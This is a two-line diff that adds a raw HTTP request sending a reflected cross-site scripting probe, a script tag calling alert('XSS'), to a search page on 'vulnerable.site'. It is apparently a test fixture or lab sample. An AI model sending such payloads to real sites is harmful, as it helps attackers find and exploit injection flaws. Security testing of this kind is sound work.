@@ -1,0 +1,2 @@
+GET /search.php?q=<script>alert('XSS')</script> HTTP/1.1
+Host: vulnerable.site
